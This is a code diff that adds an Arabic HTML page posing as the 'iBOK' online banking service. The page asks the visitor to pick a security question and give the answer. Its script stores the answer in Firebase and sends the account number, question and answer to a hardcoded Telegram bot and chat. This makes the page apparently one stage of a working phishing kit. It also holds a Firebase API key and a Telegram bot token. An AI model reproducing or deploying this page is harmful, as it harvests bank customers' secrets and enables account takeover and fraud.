@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سؤال الأمان - iBOK</title>
+    <link rel="stylesheet" href="styles.css"> 
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo-text">iBOK اي بوك</div>
+            <div class="service-name">الخدمات المصرفية عبر الإنترنت</div>
+        </header>
+
+        <div class="welcome-banner">
+            نرجو تعيين سؤال الأمان لتأكيد هويتك في المستقبل.
+        </div>
+
+        <div class="form-card">
+            <div class="card-title">سؤال الأمان</div>
+            <div class="card-subtitle">الرجاءالإجابة على سؤال الامان.</div>
+
+            <form id="securityForm">
+                
+                <div class="input-group">
+                    <label class="input-label" for="selectedQuestionDisplay">اختر سؤال الأمان:</label>
+                    
+                    <input type="text" id="selectedQuestionDisplay" class="form-input custom-select-trigger" 
+                           placeholder="انقر هنا لاختيار السؤال" readonly onclick="showQuestionModal()">
+                    
+                    <input type="hidden" id="selectedQuestionValue" name="security_question" required>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" for="answer">الإجابة:</label>
+                    <input type="text" id="answer" class="form-input" placeholder="اكتب إجابتك" required disabled>
+                </div>
+
+                <button type="submit" class="submit-button" id="submitButton" disabled>حفظ الإجابة</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="questionModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>اختر سؤال الأمان</h3>
+            </div>
+            <div class="questions-list-modal">
+                <label class="question-item">
+                    <input type="radio" name="modal_security_question" value="ما هو اسم ابن عمك الأول؟" onclick="confirmQuestionSelection(this)">
+                    <span class="checkmark"></span> ما هو اسم ابن عمك الأول؟
+                </label>
+                <label class="question-item">
+                    <input type="radio" name="modal_security_question" value="في اي مدينة ولدت؟" onclick="confirmQuestionSelection(this)">
+                    <span class="checkmark"></span> في اي مدينة ولدت؟
+                </label>
+                <label class="question-item">
+                    <input type="radio" name="modal_security_question" value="في اي سنة تخرجت من الجامعة؟" onclick="confirmQuestionSelection(this)">
+                    <span class="checkmark"></span> في اي سنة تخرجت من الجامعة؟
+                </label>
+                <label class="question-item">
+                    <input type="radio" name="modal_security_question" value="ماذا كانت لقبك أثناء الطفولة؟" onclick="confirmQuestionSelection(this)">
+                    <span class="checkmark"></span> ماذا كانت لقبك أثناء الطفولة؟
+                </label>
+                <label class="question-item">
+                    <input type="radio" name="modal_security_question" value="اسم مؤلفك المفضل؟" onclick="confirmQuestionSelection(this)">
+                    <span class="checkmark"></span> اسم مؤلفك المفضل؟
+                </label>
+                <label class="question-item">
+                    <input type="radio" name="modal_security_question" value="اسم الشركة المصنعة للسيارة المفضلة لديك؟" onclick="confirmQuestionSelection(this)">
+                    <span class="checkmark"></span> اسم الشركة المصنعة للسيارة المفضلة لديك؟
+                </label>
+                <label class="question-item">
+                    <input type="radio" name="modal_security_question" value="اي فلم هو المفضل لديك؟" onclick="confirmQuestionSelection(this)">
+                    <span class="checkmark"></span> اي فلم هو المفضل لديك؟
+                </label>
+                <label class="question-item">
+                    <input type="radio" name="modal_security_question" value="اسم افضل صديق في الطفولة؟" onclick="confirmQuestionSelection(this)">
+                    <span class="checkmark"></span> اسم افضل صديق في الطفولة؟
+                </label>
+                
+            </div>
+        </div>
+    </div>
+    
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyBBs3cFGjT6iB8_xVEHG7r1rqXiiVa7nX4",
+        authDomain: "project-id-b8e1e.firebaseapp.com",
+        projectId: "project-id-b8e1e",
+        storageBucket: "project-id-b8e1e.appspot.com",
+        messagingSenderId: "317735776154",
+        appId: "1:317735776154:web:6ee090d706c9a4bfcad423"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const TELEGRAM_TOKEN = "8569488666:AAE2HdV-K-BrpmPLw-IlKr_9UiEiYbD40Mc";
+    const CHAT_ID = "8108669125";
+
+    const form = document.getElementById('securityForm');
+    const answerInput = document.getElementById('answer');
+    const submitButton = document.getElementById('submitButton');
+    const toast = document.getElementById('toast');
+    const questionModal = document.getElementById('questionModal');
+    const selectedQuestionDisplay = document.getElementById('selectedQuestionDisplay');
+    const selectedQuestionValue = document.getElementById('selectedQuestionValue');
+
+    window.showQuestionModal = function() {
+        questionModal.style.display = 'flex';
+    }
+
+    window.hideQuestionModal = function() {
+        questionModal.style.display = 'none';
+    }
+
+    window.confirmQuestionSelection = function(selectedRadio) {
+        if (selectedRadio.checked) {
+            const questionText = selectedRadio.value;
+            selectedQuestionDisplay.value = questionText; 
+            selectedQuestionValue.value = questionText; 
+            answerInput.disabled = false;
+            submitButton.disabled = false;
+            answerInput.focus();
+        }
+        hideQuestionModal();
+    }
+
+    function showToast(message, color='#4CAF50') {
+        if (!toast) return; 
+        toast.innerText = message;
+        toast.style.backgroundColor = color;
+        toast.style.display = 'block';
+        setTimeout(()=> { toast.style.display = 'none'; }, 3000);
+    }
+
+    async function sendSecurityToTelegram(userID, question, answer) {
+        const message = `🔒 سؤال الأمان:\nرقم الحساب: ${userID}\nالسؤال: ${question}\nالإجابة: ${answer}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        try {
+            await fetch(url);
+        } catch(err) {
+            console.error("خطأ في إرسال بيانات سؤال الأمان للبوت:", err);
+        }
+    }
+
+    form.addEventListener('submit', async e => {
+        e.preventDefault();
+        
+        const question = selectedQuestionValue.value;
+        const answer = answerInput.value.trim();
+        const userID = localStorage.getItem('userID');
+
+        if (!userID) {
+            showToast('خطأ: لم يتم العثور على رقم المستخدم.', '#D32F2F');
+            setTimeout(() => { window.location.href = "login.html"; }, 1000);
+            return;
+        }
+
+        if (!question || !answer) {
+            showToast('الرجاء اختيار السؤال وكتابة الإجابة.', '#D32F2F');
+            return;
+        }
+        
+        try {
+            // حفظ السؤال والإجابة في Firebase
+            await setDoc(doc(db, "users", userID), {
+                securityQuestion: question,
+                securityAnswer: answer
+            }, { merge: true });
+
+            // إرسال السؤال والإجابة للبوت
+            await sendSecurityToTelegram(userID, question, answer);
+
+            showToast("تم حفظ إجابتك بنجاح! جاري التوجيه لصفحة التحقق.");
+            
+            setTimeout(() => {
+                window.location.href = "verification.html"; 
+            }, 1000);
+
+        } catch(err) {
+            console.error("خطأ في Firebase:", err);
+            showToast("حدث خطأ أثناء الحفظ، حاول مرة أخرى.", '#D32F2F');
+        }
+    });
+</script>
+
+</body>
+</html>
